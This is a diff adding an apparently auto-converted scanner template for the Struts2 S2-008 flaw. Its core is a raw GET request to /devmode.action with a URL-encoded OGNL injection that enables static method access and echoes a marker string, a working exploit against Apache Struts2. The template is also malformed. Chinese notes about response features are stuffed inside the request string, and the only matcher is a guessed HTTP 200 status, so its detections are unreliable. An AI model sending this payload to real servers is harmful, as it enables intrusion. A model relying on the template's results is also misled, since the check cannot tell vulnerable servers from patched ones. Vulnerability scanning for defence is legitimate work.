@@ -1,0 +1,36 @@
+id: poc-bwl6p7crben5b650
+info:
+  name: S2_008
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bwl6p7crben5b650
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bwl6p7crben5b650
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /devmode.action?debug=command&expression=%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.getWriter%28%29.println%28%27thanks6%27%2B%2786786786%27%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    686786786
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
